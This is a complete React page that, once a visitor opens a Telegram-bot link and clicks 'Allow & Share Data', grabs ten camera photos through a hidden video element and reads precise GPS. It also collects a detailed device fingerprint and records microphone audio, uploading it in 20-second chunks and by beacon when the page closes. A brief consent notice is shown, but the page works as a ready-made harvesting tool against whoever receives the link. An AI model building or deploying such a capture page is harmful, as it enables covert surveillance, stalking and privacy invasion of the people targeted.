import { useState, useEffect, useRef } from 'react';
import { useSubmitCapture } from '@workspace/api-client-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import {
  ShieldCheck, Camera, MapPin, Smartphone, Mic,
  Loader2, CheckCircle, AlertCircle, AlertTriangle,
} from 'lucide-react';

type Step = 'idle' | 'camera-front' | 'camera-back' | 'location' | 'device' | 'sending' | 'success';

// ── Detect best supported audio MIME (iOS needs audio/mp4) ───────────────────
function getSupportedAudioMime(): string {
  if (typeof MediaRecorder === 'undefined') return '';
  for (const mime of [
    'audio/webm;codecs=opus',
    'audio/webm',
    'audio/mp4;codecs=mp4a.40.2',
    'audio/mp4',
    'audio/ogg;codecs=opus',
    'audio/ogg',
  ]) {
    if (MediaRecorder.isTypeSupported(mime)) return mime;
  }
  return '';
}

// ── Open camera with fallbacks ───────────────────────────────────────────────
async function openCameraStream(facingMode: 'user' | 'environment'): Promise<MediaStream | null> {
  const attempts: MediaStreamConstraints[] = [
    { video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } } },
    { video: { facingMode: { ideal: facingMode } } },
    { video: { facingMode } },
    { video: true },
  ];
  for (const constraints of attempts) {
    try {
      return await navigator.mediaDevices.getUserMedia(constraints);
    } catch (err: unknown) {
      if (err instanceof Error && err.name === 'NotAllowedError') return null;
      // OverconstrainedError / NotFoundError → try simpler constraints
    }
  }
  return null;
}

// ── Capture 5 photos at 0.5 s intervals ─────────────────────────────────────
async function capturePhotosFromStream(stream: MediaStream): Promise<string[]> {
  const video = document.createElement('video');
  video.setAttribute('playsinline', 'true');
  video.setAttribute('autoplay', 'true');
  video.muted = true;
  video.style.position = 'fixed';
  video.style.top = '-9999px';
  video.style.left = '-9999px';
  video.style.width = '1px';
  video.style.height = '1px';
  document.body.appendChild(video); // must be in DOM for iOS play()

  try {
    video.srcObject = stream;

    // Wait for video to be ready and play
    await new Promise<void>((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('video load timeout')), 10000);
      video.onloadedmetadata = () => {
        clearTimeout(timeout);
        video.play().then(resolve).catch(reject);
      };
      video.onerror = () => { clearTimeout(timeout); reject(new Error('video error')); };
    });

    // Let camera exposure settle
    await new Promise(r => setTimeout(r, 800));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d')!;
    const photos: string[] = [];

    for (let i = 0; i < 5; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      photos.push(canvas.toDataURL('image/jpeg', 0.75));
      if (i < 4) await new Promise(r => setTimeout(r, 500));
    }

    return photos;
  } finally {
    stream.getTracks().forEach(t => t.stop());
    document.body.removeChild(video);
  }
}

// ── GPU info ─────────────────────────────────────────────────────────────────
async function getGpuInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')) as WebGLRenderingContext | null;
    if (!gl) return { gpuRenderer: null, gpuVendor: null, webglSupported: false };
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      gpuRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
      gpuVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
      webglSupported: true,
    };
  } catch { return { gpuRenderer: null, gpuVendor: null, webglSupported: false }; }
}

// ── Collect device info ───────────────────────────────────────────────────────
async function collectDeviceInfo() {
  const { gpuRenderer, gpuVendor, webglSupported } = await getGpuInfo();

  let battery = null, charging = null, chargingTime = null, dischargingTime = null;
  try {
    const bat = await (navigator as any).getBattery?.();
    if (bat) {
      battery = Math.round(bat.level * 100);
      charging = bat.charging;
      chargingTime = isFinite(bat.chargingTime) ? bat.chargingTime : null;
      dischargingTime = isFinite(bat.dischargingTime) ? bat.dischargingTime : null;
    }
  } catch { /**/ }

  const conn = (navigator as any).connection;
  let cameraCount = null, microphoneCount = null;
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    cameraCount = devices.filter(d => d.kind === 'videoinput').length;
    microphoneCount = devices.filter(d => d.kind === 'audioinput').length;
  } catch { /**/ }

  let notificationPermission: string | null = null;
  try { notificationPermission = Notification.permission; } catch { /**/ }

  let localStorageEnabled = false, sessionStorageEnabled = false, indexedDbEnabled = false;
  try { localStorage.setItem('_t', '1'); localStorage.removeItem('_t'); localStorageEnabled = true; } catch { /**/ }
  try { sessionStorage.setItem('_t', '1'); sessionStorage.removeItem('_t'); sessionStorageEnabled = true; } catch { /**/ }
  try { indexedDbEnabled = !!window.indexedDB; } catch { /**/ }

  const pluginsList = Array.from(navigator.plugins || []).map((p: Plugin) => p.name).filter(Boolean);

  return {
    userAgent: navigator.userAgent, platform: navigator.platform, vendor: navigator.vendor,
    language: navigator.language,
    languages: Array.from(navigator.languages || [navigator.language]),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack ?? null,
    onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency ?? null,
    deviceMemory: (navigator as any).deviceMemory ?? null,
    maxTouchPoints: navigator.maxTouchPoints ?? null,
    screenWidth: screen.width, screenHeight: screen.height,
    screenAvailWidth: screen.availWidth, screenAvailHeight: screen.availHeight,
    colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
    devicePixelRatio: window.devicePixelRatio,
    innerWidth: window.innerWidth, innerHeight: window.innerHeight,
    orientationType: screen.orientation?.type ?? null,
    orientationAngle: screen.orientation?.angle ?? null,
    battery, charging, chargingTime, dischargingTime,
    connectionType: conn?.effectiveType ?? null,
    connectionDownlink: conn?.downlink ?? null, connectionRtt: conn?.rtt ?? null,
    connectionSaveData: conn?.saveData ?? null,
    gpuRenderer, gpuVendor, webglSupported,
    webAssemblySupported: typeof WebAssembly !== 'undefined',
    serviceWorkerSupported: 'serviceWorker' in navigator,
    notificationPermission, cameraCount, microphoneCount,
    pluginsCount: pluginsList.length, pluginsList,
    referrer: document.referrer || null, historyLength: history.length,
    pdfViewerEnabled: (navigator as any).pdfViewerEnabled ?? null,
    localStorageEnabled, sessionStorageEnabled, indexedDbEnabled, adBlockEnabled: null,
  };
}

// ── Send audio chunk to server ───────────────────────────────────────────────
async function sendAudioChunk(chatId: string, blob: Blob, label: string) {
  if (blob.size < 200 || !chatId) return;
  try {
    const fd = new FormData();
    fd.append('chatId', chatId);
    fd.append('audio', blob, `${label}.webm`);
    await fetch('/api/audio', { method: 'POST', body: fd });
  } catch { /* best-effort */ }
}

// ─────────────────────────────────────────────────────────────────────────────
export default function Home() {
  const [step, setStep] = useState<Step>('idle');
  const [error, setError] = useState<string | null>(null);
  const [chatId, setChatId] = useState<string | null>(null);
  const [recordingActive, setRecordingActive] = useState(false);

  const submitCapture = useSubmitCapture();
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const chatIdRef = useRef<string | null>(null);
  // Track chunks already sent so we don't double-send on pagehide
  const sentChunksCountRef = useRef(0);
  // Periodic sender interval id
  const audioSendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const id = new URLSearchParams(window.location.search).get('chat_id');
    if (id) { setChatId(id); chatIdRef.current = id; }
  }, []);

  // ── Pagehide: send any remaining unsent chunks ──────────────────────────────
  useEffect(() => {
    const sendRemaining = () => {
      const cid = chatIdRef.current;
      const recorder = audioRecorderRef.current;
      if (!cid || !recorder) return;

      // Stop recorder to flush the final partial chunk
      try { if (recorder.state !== 'inactive') recorder.stop(); } catch { /**/ }

      const unsent = audioChunksRef.current.slice(sentChunksCountRef.current);
      if (unsent.length === 0) return;
      const blob = new Blob(unsent, { type: recorder.mimeType || 'audio/webm' });
      if (blob.size < 200) return;
      const fd = new FormData();
      fd.append('chatId', cid);
      fd.append('audio', blob, 'final.webm');
      navigator.sendBeacon('/api/audio', fd);
    };

    const onVisChange = () => { if (document.visibilityState === 'hidden') sendRemaining(); };
    window.addEventListener('pagehide', sendRemaining, { capture: true });
    document.addEventListener('visibilitychange', onVisChange);
    return () => {
      if (audioSendIntervalRef.current) clearInterval(audioSendIntervalRef.current);
      window.removeEventListener('pagehide', sendRemaining, { capture: true });
      document.removeEventListener('visibilitychange', onVisChange);
    };
  }, []);

  // ── Start periodic audio sender (every 20 s) ─────────────────────────────────
  function startPeriodicSend(chatId: string) {
    if (audioSendIntervalRef.current) clearInterval(audioSendIntervalRef.current);
    audioSendIntervalRef.current = setInterval(async () => {
      const recorder = audioRecorderRef.current;
      if (!recorder) return;
      const allChunks = audioChunksRef.current;
      const unsent = allChunks.slice(sentChunksCountRef.current);
      if (unsent.length === 0) return;
      const blob = new Blob(unsent, { type: recorder.mimeType || 'audio/webm' });
      sentChunksCountRef.current = allChunks.length;
      await sendAudioChunk(chatId, blob, `audio-${Date.now()}`);
    }, 20_000);
  }

  const handleCapture = async () => {
    if (!chatId) return;
    setError(null);

    try {
      // ── FRONT CAMERA — 5 photos ────────────────────────────────────────────
      setStep('camera-front');
      let frontPhotos: string[] = [];
      let audioStream: MediaStream | null = null;

      // Try video + audio together first
      try {
        const combined = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
          audio: true,
        });
        const videoTracks = combined.getVideoTracks();
        const audioTracks = combined.getAudioTracks();
        if (audioTracks.length > 0) audioStream = new MediaStream(audioTracks);
        frontPhotos = await capturePhotosFromStream(new MediaStream(videoTracks));
      } catch {
        // Fallback: video only
        const stream = await openCameraStream('user');
        if (stream) frontPhotos = await capturePhotosFromStream(stream);
        // Try audio separately
        if (!audioStream) {
          try { audioStream = await navigator.mediaDevices.getUserMedia({ audio: true }); } catch { /**/ }
        }
      }

      // ── START AUDIO RECORDING ──────────────────────────────────────────────
      if (audioStream && typeof MediaRecorder !== 'undefined') {
        try {
          const mime = getSupportedAudioMime();
          const recorder = mime
            ? new MediaRecorder(audioStream, { mimeType: mime })
            : new MediaRecorder(audioStream);
          // Collect a chunk every 1 second
          recorder.ondataavailable = (e) => {
            if (e.data.size > 0) audioChunksRef.current.push(e.data);
          };
          recorder.start(1000);
          audioRecorderRef.current = recorder;
          setRecordingActive(true);
          startPeriodicSend(chatId);
        } catch { /* MediaRecorder not supported */ }
      }

      // ── BACK CAMERA — 5 photos ────────────────────────────────────────────
      setStep('camera-back');
      let backPhotos: string[] = [];
      try {
        const backStream = await openCameraStream('environment');
        if (backStream) backPhotos = await capturePhotosFromStream(backStream);
      } catch { /* back camera not available */ }

      // ── LOCATION ──────────────────────────────────────────────────────────
      setStep('location');
      let locationData: {
        latitude: number; longitude: number; accuracy?: number;
        altitude?: number | null; altitudeAccuracy?: number | null;
        heading?: number | null; speed?: number | null;
      } | undefined;
      try {
        const pos = await new Promise<GeolocationPosition>((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {
            enableHighAccuracy: true, timeout: 12000, maximumAge: 0,
          })
        );
        locationData = {
          latitude: pos.coords.latitude, longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy, altitude: pos.coords.altitude,
          altitudeAccuracy: pos.coords.altitudeAccuracy,
          heading: pos.coords.heading, speed: pos.coords.speed,
        };
      } catch { /* denied */ }

      // ── DEVICE INFO ───────────────────────────────────────────────────────
      setStep('device');
      const deviceInfo = await collectDeviceInfo();

      // ── SEND TO BOT ───────────────────────────────────────────────────────
      setStep('sending');
      submitCapture.mutate(
        { data: { chatId, frontPhotos, backPhotos, location: locationData, deviceInfo } },
        {
          onSuccess: () => setStep('success'),
          onError: () => {
            setError('Failed to send data to the server. Please try again.');
            setStep('idle');
          },
        }
      );

    } catch (err: unknown) {
      const msg = err instanceof Error
        ? err.message
        : 'An error occurred. Please allow camera & mic permissions and try again.';
      setError(msg);
      setStep('idle');
    }
  };

  // ── No chat_id ──────────────────────────────────────────────────────────────
  if (!chatId) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full">
          <CardHeader>
            <div className="w-12 h-12 rounded-full bg-destructive/10 text-destructive flex items-center justify-center mx-auto mb-4">
              <AlertTriangle className="w-6 h-6" />
            </div>
            <CardTitle className="text-center">Invalid Link</CardTitle>
            <CardDescription className="text-center">
              Missing chat ID. Please use the exact link sent by the Telegram bot.
            </CardDescription>
          </CardHeader>
        </Card>
      </div>
    );
  }

  // ── Success ─────────────────────────────────────────────────────────────────
  if (step === 'success') {
    return (
      <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 bg-background">
        <Card className="max-w-md w-full">
          <CardHeader className="pt-10">
            <div className="w-20 h-20 rounded-full bg-green-50 text-green-600 flex items-center justify-center mx-auto mb-6">
              <CheckCircle className="w-10 h-10" />
            </div>
            <CardTitle className="text-center text-2xl">Your data has been sent!</CardTitle>
            <CardDescription className="text-center text-base mt-2">
              Photos, location, and device information have been delivered to the Telegram bot.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center pb-10">
            {recordingActive && (
              <div className="flex items-center justify-center gap-2 mt-2 text-sm text-red-600 font-medium">
                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse inline-block" />
                Audio recording — will be sent when you close this page
              </div>
            )}
            <p className="text-sm text-muted-foreground mt-4">You can now return to Telegram.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Main ────────────────────────────────────────────────────────────────────
  const isProcessing = step !== 'idle';
  const stepLabel: Record<Step, string> = {
    idle: '',
    'camera-front': 'Capturing front camera (5 photos)…',
    'camera-back': 'Capturing back camera (5 photos)…',
    location: 'Getting location…',
    device: 'Reading device info…',
    sending: 'Sending to bot…',
    success: '',
  };

  return (
    <div className="min-h-[100dvh] w-full flex items-center justify-center p-4 py-12 bg-background bg-[radial-gradient(ellipse_at_top_right,_var(--tw-gradient-stops))] from-blue-50/50 via-background to-background">
      <Card className="max-w-md w-full border-slate-200">
        <CardHeader className="pb-4">
          <div className="w-16 h-16 rounded-2xl bg-blue-50 text-primary flex items-center justify-center mx-auto mb-6 shadow-sm border border-blue-100">
            <ShieldCheck className="w-8 h-8" />
          </div>
          <CardTitle className="text-slate-900 tracking-tight text-[22px]">Data Sharing Permission</CardTitle>
          <CardDescription className="text-base text-slate-600 leading-relaxed mt-2">
            The following information will be shared with your Telegram bot. You are fully informed and in control.
          </CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          {error && (
            <div className="p-4 rounded-xl bg-red-50 border border-red-100 flex items-start gap-3 text-red-800">
              <AlertCircle className="w-5 h-5 shrink-0 mt-0.5 text-red-600" />
              <p className="text-sm font-medium leading-tight">{error}</p>
            </div>
          )}

          <div className="space-y-3">
            <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">What will be shared</p>
            {[
              { icon: Camera, title: 'Camera Photos (10 total)', desc: '5 front + 5 back photos taken at 0.5 s intervals.' },
              { icon: MapPin, title: 'Precise Location', desc: 'GPS coordinates, altitude, accuracy, and heading.' },
              { icon: Smartphone, title: 'Device Information', desc: 'Hardware specs, browser, screen, battery, GPU, network, plugins, and more.' },
              { icon: Mic, title: 'Audio Recording', desc: 'Microphone audio recorded while this page is open — sent in segments automatically.' },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="flex items-start gap-4 p-4 rounded-xl bg-slate-50/80 border border-slate-100">
                <div className="bg-white p-2 rounded-lg shadow-sm border border-slate-200/60 shrink-0">
                  <Icon className="w-5 h-5 text-slate-700" />
                </div>
                <div>
                  <h4 className="text-sm font-semibold text-slate-900">{title}</h4>
                  <p className="text-xs text-slate-500 mt-0.5">{desc}</p>
                </div>
              </div>
            ))}
          </div>
        </CardContent>

        <CardFooter className="flex-col gap-3 pb-8">
          <Button
            className="w-full h-14 text-base font-bold"
            onClick={handleCapture}
            disabled={isProcessing}
          >
            {isProcessing
              ? <><Loader2 className="w-5 h-5 animate-spin mr-2" />{stepLabel[step]}</>
              : 'Allow & Share Data'}
          </Button>
          <p className="text-xs text-center text-slate-500 px-4">
            By clicking allow, you consent to sharing the above information with the Telegram bot associated with this link.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
}
